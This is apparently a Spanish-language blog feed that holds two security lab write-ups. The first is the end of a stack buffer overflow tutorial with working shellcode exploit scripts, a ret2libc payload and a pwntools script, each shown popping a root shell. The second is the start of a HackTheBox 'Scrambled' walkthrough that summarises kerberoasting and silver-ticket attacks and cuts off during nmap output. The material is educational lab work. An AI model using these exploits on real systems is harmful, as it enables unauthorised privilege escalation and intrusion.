0xffffd480:	0x0000001c	0x00000020	0x00000000	0x00000000
0xffffd490:	0x00000000	0x00000000	0x29000000	0xf4d13484
0xffffd4a0:	0xe3943ad4	0xa212ba18	0x6939ccce	0x00363836
0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x6d6f682f
0xffffd4c0:	0x696d2f65	0x6c657567	0x6174532f	0x764f6b63
0xffffd4d0:	0x6c667265	0x6c2f776f	0x6c657665	0x656c2f73
0xffffd4e0:	0x546c6576	0x65657268	0x90909000	0x90909090
0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd560:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd570:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd580:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd590:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd5e0:	0x99580b6a	0x2f2f6852	0x2f686873	0x896e6962
0xffffd5f0:	0xcdc931e3	0x42424280	0x4f430042	0x54524f4c
0xffffd600:	0x3d4d5245	0x65757274	0x6f6c6f63	0x49440072
0xffffd610:	0x414c5053	0x303a3d59	0x4e414c00	0x2e433d47
0xffffd620:	0x2d465455	0x41500038	0x2f3d4854	0x2f727375
0xffffd630:	0x61636f6c	0x62732f6c	0x2f3a6e69	0x2f727375
0xffffd640:	0x61636f6c	0x69622f6c	0x752f3a6e	0x732f7273
0xffffd650:	0x3a6e6962	0x7273752f	0x6e69622f	0x62732f3a
0xffffd660:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x636f6c2f
0xffffd670:	0x672f6c61	0x73656d61	0x73752f3a	0x61672f72
0xffffd680:	0x0073656d	0x4d524554	0x616c613d	0x74697263
0xffffd690:	0x58007974	0x48545541	0x5449524f	0x682f3d59
0xffffd6a0:	0x2f656d6f	0x7567696d	0x2e2f6c65	0x74756158
0xffffd6b0:	0x69726f68	0x58007974	0x435f4744	0x45525255
0xffffd6c0:	0x445f544e	0x544b5345	0x693d504f	0x534c0033
0xffffd6d0:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
0xffffd6e0:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Bueno vamos a tomar una dirección que contengo solo <code class="language-plaintext highlighter-rouge">nops</code> que es la esta mas repetida en este caso seria esta que yo elegí <code class="language-plaintext highlighter-rouge">0xffffd520:0x90909090</code>.</p>
  </li>
  <li>
    <p><strong>Junk</strong> contiene una secuencia de caracteres <code class="language-plaintext highlighter-rouge">\x90</code> que, en hexadecimal, equivale a <code class="language-plaintext highlighter-rouge">0x90</code>, que es una sola instrucción <code class="language-plaintext highlighter-rouge">NOP</code>.</p>
  </li>
  <li>
    <p>De igual forma estamos en <code class="language-plaintext highlighter-rouge">little endian</code> así que vamos a darle la vuelta.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xffffd530    | <span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>d5<span class="se">\x</span>30     | <span class="se">\x</span>30<span class="se">\x</span>d5<span class="se">\x</span>ff<span class="se">\x</span>ff
</code></pre></div></div>

<ul>
  <li>Ahora lo que vamos a hacer es cambiar los 4 B que habías puesto por la dirección en los <code class="language-plaintext highlighter-rouge">nops</code> esto para que los <code class="language-plaintext highlighter-rouge">nops</code> se desplacen en la pila asta llegar al <code class="language-plaintext highlighter-rouge">shellcode</code> y se ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>otro.py
<span class="c">#!/usr/bin/python2</span>
<span class="c"># -*- coding: utf-8 -*-</span>

offset <span class="o">=</span> 268  <span class="c"># En el shellcode son las instrucciones maliciosas</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

<span class="c"># x90 representa la instrucción "NOP" en lenguaje de máquina</span>
junk <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">90"</span> <span class="k">*</span> <span class="o">(</span>offset - len<span class="o">(</span>shellcode<span class="o">))</span>

<span class="c"># Usamos la dirección deseada en little endian</span>
eip <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff"</span>

<span class="c"># Salida del payload completo</span>
print<span class="o">(</span>junk + shellcode + eip<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelThree <span class="si">$(</span>python2 otro.py<span class="si">)</span>
Buf: j
      XRh//shh/bin��0�
<span class="c"># whoami</span>
root
</code></pre></div></div>

<h2 id="ret2libc">Ret2libc</h2>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">Ret2libc</code>, abreviatura de “<code class="language-plaintext highlighter-rouge">return-to-libc</code>”, es una técnica clásica de explotación utilizada para eludir medidas de seguridad que previenen la ejecución de código inyectado, como las protecciones contra ejecución en la pila (<code class="language-plaintext highlighter-rouge">stack</code>). Esta técnica implica manipular la pila de llamadas de un programa vulnerable para hacer que ejecute funciones ya presentes en la biblioteca <code class="language-plaintext highlighter-rouge">libc</code>, como <code class="language-plaintext highlighter-rouge">system()</code>, que puede ejecutar comandos de <code class="language-plaintext highlighter-rouge">shell</code>.</p>
  </li>
  <li>
    <p>Vamos analizar el código.</p>
  </li>
  <li>
    <p>Esta es la función main.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret.png" />
</p>

<ul>
  <li>Esta es la función <code class="language-plaintext highlighter-rouge">overflow</code> y vemos que le esta dando 20 bytes de tamaño al buffer.</li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/ret1.png" />
</p>

<ul>
  <li>
    <p>El problema de ahora es que no podemos correr el <code class="language-plaintext highlighter-rouge">shellcode</code> de antes por que mide mas del buffer asignado.</p>
  </li>
  <li>
    <p>Comenzamos enviado 50 bytes.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels gdb <span class="nt">-q</span> levelFour
Reading symbols from levelFour...
<span class="o">(</span>No debugging symbols found <span class="k">in </span>levelFour<span class="o">)</span>
gdb-peda<span class="nv">$ </span>pattern_arg 50
Set 1 arguments to program
gdb-peda<span class="nv">$ </span>run
Starting program: /home/miguel/StackOverflow/levels/levelFour <span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span>
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Buf: AAA%AAsAABAA<span class="nv">$AAnAACAA</span><span class="nt">-AA</span><span class="o">(</span>AADAA<span class="p">;</span>AA<span class="o">)</span>AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
Warning: <span class="s1">'set logging off'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled off'</span><span class="nb">.</span>

Warning: <span class="s1">'set logging on'</span>, an <span class="nb">alias </span><span class="k">for </span>the <span class="nb">command</span> <span class="s1">'set logging enabled'</span>, is deprecated.
Use <span class="s1">'set logging enabled on'</span><span class="nb">.</span>
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x38 <span class="o">(</span><span class="s1">'8'</span><span class="o">)</span>
EBX: 0x41412d41 <span class="o">(</span><span class="s1">'A-AA'</span><span class="o">)</span>
ECX: 0xffffcf4c <span class="nt">--</span><span class="o">&gt;</span> 0x48d58600
EDX: 0x1
ESI: 0xffffd010 <span class="nt">--</span><span class="o">&gt;</span> 0x2
EDI: 0xf7ffcba0 <span class="nt">--</span><span class="o">&gt;</span> 0x0
EBP: 0x44414128 <span class="o">(</span><span class="s1">'(AAD'</span><span class="o">)</span>
ESP: 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
EIP: 0x413b4141 <span class="o">(</span><span class="s1">'AA;A'</span><span class="o">)</span>
EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
Invalid <span class="nv">$PC</span> address: 0x413b4141
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xffffcfc0 <span class="o">(</span><span class="s2">"A)AAEAAaAA0AAFAAbA"</span><span class="o">)</span>
0004| 0xffffcfc4 <span class="o">(</span><span class="s2">"EAAaAA0AAFAAbA"</span><span class="o">)</span>
0008| 0xffffcfc8 <span class="o">(</span><span class="s2">"AA0AAFAAbA"</span><span class="o">)</span>
0012| 0xffffcfcc <span class="o">(</span><span class="s2">"AFAAbA"</span><span class="o">)</span>
0016| 0xffffcfd0 <span class="nt">--</span><span class="o">&gt;</span> 0x4162 <span class="o">(</span><span class="s1">'bA'</span><span class="o">)</span>
0020| 0xffffcfd4 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0xffffcfd8 <span class="nt">--</span><span class="o">&gt;</span> 0x13
0028| 0xffffcfdc <span class="nt">--</span><span class="o">&gt;</span> 0x3e8
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 <span class="k">in</span> ?? <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">offset</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset 0x413b4141
1094402369 found at offset: 28
</code></pre></div></div>

<ul>
  <li>En este tipo de explotaciones tenemos que saber la dirección de la función <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">exit</code> ya que son funciones de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p system
<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c4c870 &lt;system&gt;
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Ahora la dirección de <code class="language-plaintext highlighter-rouge">exit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7c3c130 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ver la dirección de <code class="language-plaintext highlighter-rouge">/bin/sh</code> de <code class="language-plaintext highlighter-rouge">libc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>find /bin/sh
Searching <span class="k">for</span> <span class="s1">'/bin/sh'</span> <span class="k">in</span>: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0xf7db5fc8 <span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Estamos en <code class="language-plaintext highlighter-rouge">little endian</code> entonces tenemos que darle la vuelta a todas las direcciones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0xf7c4c870    |   <span class="se">\x</span>f7<span class="se">\x</span>c4<span class="se">\x</span>c8<span class="se">\x</span>70
0xf7c3c130    |   <span class="se">\x</span>f7<span class="se">\x</span>c3<span class="se">\x</span>c1<span class="se">\x</span>30
0xf7db5fc8    |   <span class="se">\x</span>f7<span class="se">\x</span>db<span class="se">\x</span>5f<span class="se">\x</span>c8
</code></pre></div></div>

<ul>
  <li>Ahora definimos el script.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">cat </span>levelFour.py
<span class="c">#!/usr/bin/python2</span>

offset <span class="o">=</span> 28

junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset

addr_system <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">f7"</span>
addr_exit <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">f7"</span>
addr_bin_sh <span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">f7"</span> <span class="c"># aqui es donde llamamos a /bin/bash para que nos de una shell</span>

print<span class="o">(</span>junk + addr_system + addr_exit + addr_bin_sh<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelFour <span class="si">$(</span>python2 levelFour.py<span class="si">)</span>
Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
<span class="c"># whoami</span>
root
</code></pre></div></div>

<h2 id="level-5">Level 5</h2>

<ul>
  <li>Gracias a xchg2pwn por la aportación <a href="https://xchg2pwn.github.io">https://xchg2pwn.github.io</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
from pwn import process, p32

shell <span class="o">=</span> process<span class="o">(</span><span class="s2">"./levelFive"</span><span class="o">)</span>

offset <span class="o">=</span> 16
junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset

jmpesp <span class="o">=</span> p32<span class="o">(</span>0xf7dd4ff7<span class="o">)</span>

setuid <span class="o">=</span> b<span class="s2">"1</span><span class="se">\x</span><span class="s2">dbj</span><span class="se">\x</span><span class="s2">17X</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

shellcode  <span class="o">=</span> b<span class="s2">""</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>

shell.sendline<span class="o">(</span>junk + jmpesp + setuid + shellcode<span class="o">)</span>
shell.interactive<span class="o">()</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="vulnhub/machines" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Scrambled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" rel="alternate" type="text/html" title="HackTheBox - Scrambled (medium)" /><published>2024-04-30T00:00:00-06:00</published><updated>2024-04-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png" />
</p>

<ul>
  <li>Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user <code class="language-plaintext highlighter-rouge">ksimpson</code>. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the <code class="language-plaintext highlighter-rouge">Public</code> share with the credentials of <code class="language-plaintext highlighter-rouge">ksimpson</code>, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account <code class="language-plaintext highlighter-rouge">SqlSvc</code> has a <code class="language-plaintext highlighter-rouge">Service Principal Name</code> (SPN) associated with it. An attacker can use this information to perform an attack that is knows as <code class="language-plaintext highlighter-rouge">kerberoasting</code> and get the hash of <code class="language-plaintext highlighter-rouge">SqlSvc</code>. After cracking the hash and acquiring the credentials for the <code class="language-plaintext highlighter-rouge">SqlSvc</code> account an attacker can perform a <code class="language-plaintext highlighter-rouge">silver ticket</code> attack to forge a ticket and impersonate the user <code class="language-plaintext highlighter-rouge">Administrator</code> on the remote MSSQL service. Enumeration of the database reveals the credentials for user <code class="language-plaintext highlighter-rouge">MiscSvc</code>, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a <code class="language-plaintext highlighter-rouge">.NET</code> application, which is listening on port <code class="language-plaintext highlighter-rouge">4411</code>. Reverse engineering the application reveals that it is using the insecure <code class="language-plaintext highlighter-rouge">Binary Formatter</code> class to transmit data, allowing the attacker to upload their own payload and get code execution as <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code> así como sus servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49686,49727 10.10.11.168 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-29 18:25 CST
Nmap scan report <span class="k">for </span>10.10.11.168
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>

Bug <span class="k">in </span>ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-30 00:25:54Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: <span class="nb">false</span>
|_    TCP port: 1433
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
| Not valid before: 2024-04-30T00:21:53
|_Not valid after:  2054-04-30T00:21:53
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00<span class="p">;</span> <span class="nt">-4s</span> from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
|_    ERROR_UNKNOWN_COMMAND<span class="p">;</span>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>4/29%Time<span class="o">=</span>66303A95%P<span class="o">=</span>x86_64-pc-linux-gnu%r
SF:<span class="o">(</span>NULL,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,1D,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">
SF:0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,35,<span class="s2">"SCRAMBLECORP_OR
SF:DERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,35,<span class="s2">"SCRAMB
SF:LECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UNKNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,1D,<span class="s2">"
SF:SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,1D,<span class="s2">"SCRAMBLECORP_ORDE
SF:RS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Help,35,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">ERROR_UN
SF:KNOWN_COMMAND;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\</span><span class="s2">
SF:r</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>
SF:TLSSessionReq,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,1D,<span class="s2">"SC
SF:RAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,1D,<span class="s2">"SCRAMBLECORP_ORDERS_
